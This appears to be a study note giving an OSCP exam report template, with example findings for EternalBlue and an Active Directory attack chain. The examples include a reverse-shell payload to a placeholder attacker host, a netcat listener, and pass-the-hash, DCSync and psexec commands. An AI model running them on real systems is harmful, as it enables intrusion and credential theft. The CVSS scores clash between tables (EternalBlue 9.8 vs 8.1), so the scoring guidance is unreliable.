---
tags: [oscp-journey, spectre, stage-5, oscp, report-writing, documentation]
module: 5
cert-stage: oscp
difficulty: beginner
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 8 — Reporting"]
netgod-refs: []
---

# S5-03 — OSCP Report Template

> [!info] Relationship to PHANTOM
> The full professional report template and writing guidance lives in [[PHANTOM/MODULE 8 — Reporting]]. This note is OSCP-specific — the exact structure OffSec expects, the proof requirements, and ready-to-use section templates.

---

## Report Overview — What OffSec Evaluates

OffSec markers read hundreds of OSCP reports. They are looking for:

1. **Reproducibility** — can a competent pentester follow your steps and achieve the same result on a clean machine?
2. **Evidence** — is every exploitation step backed by a screenshot?
3. **Proof compliance** — does every proof screenshot show hostname + whoami + proof.txt in ONE image?
4. **Technical accuracy** — do you understand what you exploited and why?
5. **Remediation** — have you provided actionable fixes?

A report that passes all five criteria passes, regardless of how many machines you rooted.

---

## Required Report Structure

```
1. Cover Page
2. Table of Contents
3. Executive Summary
4. Methodology Overview
5. Technical Findings (one section per compromised machine)
   5.1 — Machine 1 (IP: x.x.x.x)
   5.2 — Machine 2 (IP: x.x.x.x)
   5.3 — Machine 3 (IP: x.x.x.x)
   5.4 — Active Directory Set
       5.4.1 — AD Client (IP: x.x.x.x)
       5.4.2 — AD Server (IP: x.x.x.x)
       5.4.3 — Domain Controller (IP: x.x.x.x)
6. Appendix (optional — additional evidence, scripts)
```

---

## Section 1 — Cover Page

```
OFFENSIVE SECURITY OSCP EXAMINATION REPORT

Student Name:       [Your Full Name]
OSCP Candidate ID:  OS-XXXXX
Exam Date:          [DD Month YYYY]
Report Date:        [DD Month YYYY]
Report Version:     1.0
Classification:     Confidential
```

---

## Section 2 — Table of Contents

Generate automatically in Word/LibreOffice using heading styles. In Markdown → PDF pipelines (noraj template), it is auto-generated from headers.

---

## Section 3 — Executive Summary

**Audience:** Non-technical. Written for a CISO or manager.
**Length:** 1–2 pages maximum.
**Tone:** Professional, factual, no jargon.

**Template:**

---

> During the penetration testing assessment conducted on [DATE], [X] of 5 target systems were successfully compromised, with full administrative access obtained on [X] systems. The assessment revealed [X] critical, [X] high, and [X] medium severity vulnerabilities across the examined network.
>
> The most significant findings included [BRIEF DESCRIPTION OF TOP 2-3 FINDINGS IN PLAIN ENGLISH]. These vulnerabilities collectively represent significant risk to the confidentiality, integrity, and availability of the organisation's systems and data.
>
> Immediate remediation is recommended for all critical and high severity findings. A prioritised list of remediation actions is provided within the technical findings section of this report.

---

**Risk Summary Table (include at end of executive summary):**

| # | Target IP | Vulnerability | Severity | CVSS |
|---|-----------|--------------|---------|------|
| 1 | 10.10.10.X | EternalBlue MS17-010 | Critical | 9.8 |
| 2 | 10.10.10.X | Apache Path Traversal RCE | Critical | 9.8 |
| 3 | 10.10.10.X | SeImpersonatePrivilege Abuse | High | 7.8 |
| 4 | 10.10.10.X | Tomcat Default Credentials | High | 8.8 |
| 5 | AD Set | Kerberoasting → Domain Compromise | Critical | 9.9 |

---

## Section 4 — Methodology Overview

**Template:**

---

> The assessment was conducted following the Penetration Testing Execution Standard (PTES) methodology, encompassing the following phases:
>
> **Reconnaissance and Enumeration:** Network scanning was performed using Nmap to identify live hosts, open ports, and service versions. Web applications were enumerated using directory brute-forcing and manual inspection.
>
> **Vulnerability Identification:** Identified services and their versions were researched against public vulnerability databases (NVD, Exploit-DB). Manual testing was conducted against web applications and network services.
>
> **Exploitation:** Identified vulnerabilities were exploited using a combination of public proof-of-concept exploits (modified as appropriate) and manual exploitation techniques. A single Metasploit Framework exploit module was utilised in accordance with the examination rules.
>
> **Post-Exploitation:** Following successful exploitation, privilege escalation techniques were applied to obtain administrative access. Credential harvesting was performed to facilitate lateral movement where applicable.
>
> **Documentation:** All findings were documented throughout the assessment, including supporting evidence in the form of screenshots and command output.

---

## Section 5 — Technical Findings Template

Use this template for every compromised machine. Copy and fill in the blanks.

---

### 5.X — [Machine Name] (IP: 10.10.10.X)

#### 5.X.1 — Vulnerability Summary

| Field | Detail |
|-------|--------|
| **Target IP** | 10.10.10.X |
| **Hostname** | MACHINE-NAME |
| **Operating System** | Ubuntu 20.04 / Windows Server 2019 |
| **Vulnerability** | [Vulnerability Name + CVE if applicable] |
| **CVSS v3.1 Score** | X.X ([Critical/High/Medium]) |
| **Access Level Obtained** | root / NT AUTHORITY\SYSTEM |
| **Proof File** | /root/proof.txt — [HASH VALUE] |

#### 5.X.2 — Vulnerability Description

[2–3 paragraphs explaining:]
- What the vulnerability is
- Why it exists (root cause — misconfiguration, unpatched software, weak credentials)
- What impact exploitation has (what an attacker can do with it)

**Example (EternalBlue):**

> CVE-2017-0144, commonly known as EternalBlue, is a critical remote code execution vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The vulnerability exists in the way that SMBv1 handles certain types of requests, allowing an unauthenticated attacker to execute arbitrary code on the target system with SYSTEM-level privileges.
>
> The vulnerability stems from a buffer overflow condition in the srv.sys driver, which processes SMB_COM_TRANSACTION2 requests. By sending a specially crafted packet sequence, an attacker can overflow the buffer and achieve code execution in kernel context, resulting in complete system compromise without requiring any user interaction or authentication.
>
> Exploitation of this vulnerability grants an attacker full administrative control of the affected system, enabling arbitrary code execution, credential theft, data exfiltration, and use of the compromised system as a pivot point for further attacks within the network.

#### 5.X.3 — Steps to Reproduce

> [!info] Reproducibility requirement
> Steps to reproduce must be detailed enough that another competent penetration tester can follow them on a clean machine and achieve the same result. Every command must be exact. Every screenshot must be referenced by filename.

**Template:**

---

**Prerequisites:**
- Kali Linux attacker machine
- Network connectivity to target (10.10.10.X)
- Tools: Nmap, [exploit tool], nc

**Step 1 — Service Discovery**

Nmap was executed to identify open ports and service versions:

```bash
nmap -sC -sV -p- --min-rate 5000 -Pn -oA scan 10.10.10.X
```

The scan revealed port 445/tcp running Microsoft Windows SMB with SMBv1 enabled.

[Screenshot: scan_results.png]

**Step 2 — Vulnerability Confirmation**

The target was confirmed vulnerable to MS17-010 using the Nmap smb-vuln-ms17-010 script:

```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.10.X
```

Output confirmed: "VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1."

[Screenshot: vuln_confirmed.png]

**Step 3 — Exploit Preparation**

The manual MS17-010 exploit was obtained and configured:

```bash
git clone https://github.com/worawit/MS17-010
cd MS17-010

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 \
  -f raw -o shellcode.bin
```

[Screenshot: payload_generated.png]

**Step 4 — Exploit Execution**

A Netcat listener was established on the attacker machine:

```bash
nc -lvnp 4444
```

The exploit was executed against the target:

```bash
python zzz_exploit.py 10.10.10.X
```

[Screenshot: exploit_running.png]

**Step 5 — Shell Received and Proof**

A reverse shell was received as NT AUTHORITY\SYSTEM:

[Screenshot: proof_10.10.10.X.png — shows hostname, whoami output (NT AUTHORITY\SYSTEM), and proof.txt contents]

```
Hostname: BLUE
User:     NT AUTHORITY\SYSTEM
Proof:    [32-character hash from proof.txt]
```

#### 5.X.4 — Remediation

[Specific, actionable recommendations — not "patch your systems"]

**Example:**

> 1. **Apply MS17-010 patch immediately:** Install Microsoft security update KB4012212 (Windows 7) or KB4012215 (Windows Server 2008 R2). This patch has been available since March 2017 and should be considered critically overdue.
>
> 2. **Disable SMBv1:** SMBv1 is a legacy protocol with multiple known critical vulnerabilities and should be disabled on all systems. Execute the following PowerShell command on affected hosts:
>    ```powershell
>    Set-SmbServerConfiguration -EnableSMB1Protocol $false
>    ```
>
> 3. **Implement network segmentation:** Restrict SMB traffic (TCP ports 139 and 445) to only authorised hosts using host-based firewalls and network access control lists. Systems should not have SMB exposed externally or to untrusted network segments.
>
> 4. **Deploy vulnerability management:** Implement a regular patch management programme to identify and remediate critical vulnerabilities within 30 days of release.

---

## Section 5.4 — Active Directory Set Template

The AD set needs a slightly different structure since it spans three machines with a connected attack chain.

### 5.4 — Active Directory Set (10.10.10.X / 10.10.10.X / 10.10.10.X)

#### 5.4.1 — AD Set Summary

| Machine | IP | Role | Access Obtained |
|---------|-----|------|----------------|
| AD Client | 10.10.10.X | Windows 10 Workstation | NT AUTHORITY\SYSTEM |
| AD Server | 10.10.10.X | Windows Server 2019 Member | NT AUTHORITY\SYSTEM |
| Domain Controller | 10.10.10.X | Windows Server 2019 DC | NT AUTHORITY\SYSTEM |

**Domain:** domain.local
**Attack Chain Summary:** [1-2 sentences summarising the full chain from initial access to DA]

#### 5.4.2 — AD Client (IP: 10.10.10.X)

Use the standard machine template above for initial access and PrivEsc on the client.

#### 5.4.3 — Lateral Movement to Server (IP: 10.10.10.X)

**Technique:** Pass-the-Hash / Credential Reuse / Kerberoasting

> Following compromise of the AD Client, [credentials/hashes] were extracted using [tool]. These credentials were found to be valid on the AD Server, enabling lateral movement:

```bash
evil-winrm -i 10.10.10.X -u [user] -H [NTLM_HASH]
```

[Screenshot: server_access.png]

#### 5.4.4 — Domain Controller Compromise (IP: 10.10.10.X)

**Technique:** DCSync / Credential Reuse / Pass-the-Hash

> With [DA credentials / DA-equivalent rights], a DCSync attack was performed to extract all domain account hashes:

```bash
impacket-secretsdump domain/Administrator:password@10.10.10.X
```

> The Administrator hash was used to obtain a shell on the Domain Controller:

```bash
impacket-psexec domain/Administrator@10.10.10.X -hashes :NTLM_HASH
```

[Screenshot: proof_DC.png — hostname + whoami + proof.txt]

#### 5.4.5 — Active Directory Remediation

> 1. **Disable LLMNR and NBT-NS:** These protocols were used for initial credential capture. Disable via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution = Enabled.
>
> 2. **Enable SMB Signing on all machines:** SMB relay attacks are only possible when signing is not required. Enforce signing via GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network server/client: Digitally sign communications (always) = Enabled.
>
> 3. **Implement Kerberos pre-authentication:** Accounts with DONT_REQUIRE_PREAUTH set are vulnerable to AS-REP roasting. Remove this flag from all accounts unless strictly required.
>
> 4. **Service account password hygiene:** Service accounts with SPNs should have strong randomly-generated passwords (25+ characters). Consider using Group Managed Service Accounts (gMSA) which rotate passwords automatically.
>
> 5. **Implement tiered administration model:** Domain Admin accounts should not be used for routine administration. Implement Privileged Access Workstations (PAWs) and tiered account models per Microsoft security baselines.

---

## Proof Screenshot Specification

Every proof screenshot must contain all three in ONE image:

```
┌──────────────────────────────────────────────────────────────────┐
│ $ hostname                                                        │
│ target-machine                                                    │
│                                                                   │
│ $ whoami                   (OR: id)                              │
│ root                       (OR: uid=0(root)...)                  │
│                                                                   │
│ $ cat /root/proof.txt      (OR: type C:\...\proof.txt)          │
│ [32-character hash]                                               │
└──────────────────────────────────────────────────────────────────┘
```

**Command to produce all three simultaneously:**
```bash
# Linux:
hostname; id; cat /root/proof.txt

# Windows:
hostname && whoami && type C:\Users\Administrator\Desktop\proof.txt
```

**Screenshot filename convention:**
```
[IP]_proof.png       → Root/SYSTEM proof
[IP]_local.png       → User-level proof  
[IP]_step1.png       → Key exploitation step
[IP]_exploit.png     → Exploit execution
```

---

## CVSS 3.1 Quick Reference for Scoring

Use the NVD calculator at `nvd.nist.gov/vuln-metrics/cvss/v3-calculator`

**Common OSCP finding scores:**

| Finding | CVSS Score | Rating |
|---------|-----------|--------|
| EternalBlue (MS17-010) unauthenticated | 8.1 | High |
| Apache RCE unauthenticated | 9.8 | Critical |
| Tomcat default credentials → RCE | 9.8 | Critical |
| SeImpersonatePrivilege → SYSTEM (local) | 7.8 | High |
| AlwaysInstallElevated → SYSTEM (local) | 7.8 | High |
| sudo misconfiguration → root (local) | 7.8 | High |
| SUID binary abuse → root (local) | 7.8 | High |
| SQL injection → file write → RCE | 9.8 | Critical |
| Default credentials (web app) | 9.8 | Critical |
| Kerberoasting → DA | 8.8 | High |
| Weak SSH password | 6.5 | Medium |
| LFI → log poisoning → RCE | 8.8 | High |

---

## Recommended Report Tools

### Option 1 — OffSec Official Word Template

Available from the OSCP exam guide on the OffSec portal. The safe choice — exactly what markers expect.

### Option 2 — noraj Markdown → PDF Template

```bash
# Setup on Kali:
sudo apt install pandoc texlive-full
pip3 install pandoc-include

# Clone template:
git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
cd OSCP-Exam-Report-Template-Markdown

# Edit src/OSCP-exam-report.md with your findings
# Generate PDF:
make
```

### Option 3 — LibreOffice Writer

Free alternative to Microsoft Word. Opens .docx files. Works with the OffSec template.

---

## CherryTree → Report Workflow

During the exam, notes go in CherryTree. After the exam, they become the report.

**The mapping:**

| CherryTree Node | Report Section |
|----------------|---------------|
| Machine IP → Recon → Nmap output | Evidence in Step 1 |
| Machine IP → Exploitation → Commands | Steps to reproduce |
| Machine IP → Exploitation → Screenshots | Evidence screenshots |
| Machine IP → PrivEsc → Commands | Steps to reproduce (PrivEsc) |
| Machine IP → Proof → hash value | Vulnerability summary table |
| Credentials Master List | Used in lateral movement sections |

**During exam — note-taking template per machine:**
```
IP: 10.10.10.X
Hostname: [from hostname command]
OS: [from nmap or systeminfo]

=== RECON ===
[Nmap quick output paste]
[Nmap full — new ports]
[Gobuster output]

=== EXPLOITATION ===
Vulnerability: [CVE and name]
Command 1: [exact command]
Output 1: [exact relevant output]
Command 2: [exact command]
[etc.]

=== PRIVESC ===
Vector: [technique name]
Command: [exact command]
Output: [confirms escalation]

=== PROOF ===
local.txt: [hash]
proof.txt: [hash]
Screenshot: [filename]
```

---

## Report Submission Checklist

Before submitting, verify every item:

```
□ Cover page complete (name, OSCP ID, date)
□ Table of contents generated and accurate
□ Executive summary written (non-technical language)
□ Risk summary table included
□ Every compromised machine has its own section
□ Every section has: vulnerability description, steps to reproduce, evidence
□ Every exploitation step has a screenshot reference
□ Every proof screenshot shows hostname + whoami + proof.txt in ONE image
□ CVSS scores calculated and included
□ Remediation provided for every finding (specific, not generic)
□ Report exported as PDF
□ PDF file size under 200MB (compress screenshots if needed)
□ Submitted before the 24-hour deadline
```

---

## Common Report Mistakes

> [!warning] Report mistakes that cost OSCP passes
> 1. **Proof screenshots show three separate images.** OffSec requires all three (hostname, whoami, proof.txt) in ONE screenshot. This is the single most common reason for point deduction.
> 2. **Steps to reproduce are vague.** "I ran the exploit and got a shell" is not reproducible. Every command must be exact, with expected output described.
> 3. **Missing screenshots at key steps.** Claiming you exploited a vulnerability without showing the exploit running is insufficient. Screenshot every meaningful command output.
> 4. **Generic remediations.** "Apply patches" is not a remediation. Provide the specific patch name, the specific command, or the specific configuration change.
> 5. **Report submitted at the last minute.** Technical issues at hour 23:59 cause failures. Submit by hour 20 of the report window at the latest.
> 6. **Not verifying CVSS scores.** Use the NVD calculator. Wrong CVSS scores suggest you don't understand the vulnerability's impact.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| [[PHANTOM/MODULE 8 — Reporting]] | Full professional report template with examples |
| noraj template (GitHub) | Set up the Markdown pipeline now — don't learn it on exam day |
| TryHackMe — any room | Write a mini-report (2 pages) for every machine you compromise |
| HTB writeups (after machines retire) | Read how experienced pentesters structure findings |
| OSCP exam guide | Read the report requirements section 3 times before your exam |
